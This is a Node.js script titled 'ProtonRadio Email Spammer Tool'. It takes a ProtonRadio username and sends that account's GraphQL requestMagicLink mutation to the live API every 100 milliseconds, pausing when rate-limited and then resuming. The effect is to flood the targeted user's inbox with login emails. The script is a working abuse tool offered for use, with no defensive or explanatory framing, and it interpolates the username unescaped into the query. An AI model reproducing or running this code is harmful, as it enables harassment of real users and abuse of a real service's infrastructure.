const axios = require('axios');
const readline = require('readline');
const chalk = require('chalk');
const gradient = require('gradient-string');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let counter = 0;

function showHeader() {
  console.clear();
  const banner = `
           ,ggg,                                         88  ad888888b,  ad888888b, 888888888888 
          dP""8I                                  8I   ,d88 d8"     "88 d8"     "88        ,88'  
         dP   88                                  8I 888888         a88         a88      ,88"    
        dP    88                                  8I     88        ,88P        ,88P     ,88'     
       ,8'    88                                  8I     88      aad8"       aad8"   aaa888aa    
       d88888888      ,gggg,    ,gggg,gg    ,gggg,8I     88      ""Y8,       ""Y8,    ,8P        
 __   ,8"     88     d8"  Yb   dP"  "Y8I   dP"  "Y8I     88        "88b        "88b  ,88         
dP"  ,8P      Y8    dP    dP  i8'    ,8I  i8'    ,8I     88         "88         "88  88'         
Yb,_,dP       "8b,,dP  ,adP' ,d8,   ,d8b,,d8,   ,d8b,    88 Y8,     a88 Y8,     a88  88          
 "Y8P"         "Y88"   ""Y8d8P"Y8888P""Y8P"Y8888P""Y8    88  "Y888888P'  "Y888888P'  88          
                        ,d8I'                                                                    
                      ,dP'8I                                                                     
                     ,8"  8I                                                                     
                     I8   8I                                                                     
                     "8, ,8I                                                                     
                      "Y8P"                                                                      
`;

  console.log(gradient.morning.multiline(banner));
  console.log(chalk.red('ProtonRadio Email Spammer Tool'));
}

async function requestMagicLink(username) {
  const url = 'https://api.protonradio.com/graphql';

  const headers = {
    'Authorization': 'Bearer azad1337 :)',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0'
  };

  const data = {
    query: `mutation {
      requestMagicLink(input: {
        username: "${username}",
        redirectUrl: "https://www.protonradio.com/shittest-email-system-ever"
      }) {
        clientMutationId
        errors
      }
    }`
  };

  try {
    await axios.post(url, data, { headers });
    counter++;
    console.log(chalk.green(`[✓] Request #${counter} sent for user: ${username}.`));
  } catch (error) {
    const status = error.response?.status;
    const errMsg = error.response?.data?.errors?.[0]?.message || error.message;

    if (status === 503) {
      console.log(chalk.yellow(`[!] Received 503 error. Waiting 30 seconds...`));
      await new Promise(res => setTimeout(res, 30_000));
    } else {
      console.log(chalk.red(`[X] Error: ${errMsg} (${status || "Unknown"})`));
    }
  }
}

function startSpamming() {
  showHeader();

  rl.question(chalk.cyan('Enter ProtonRadio username: '), (username) => {
    if (!username.trim()) {
      console.log(chalk.red('Please enter a valid username.'));
      return startSpamming();
    }

    console.log(chalk.magentaBright(`\nSending requests for ${username}... (Press Ctrl+C to stop)`));

    const interval = setInterval(() => {
      requestMagicLink(username);
    }, 100);

    process.on('SIGINT', () => {
      clearInterval(interval);
      console.log(chalk.redBright('\n[!] Stopped. Exiting...'));
      process.exit(0);
    });
  });
}

startSpamming();
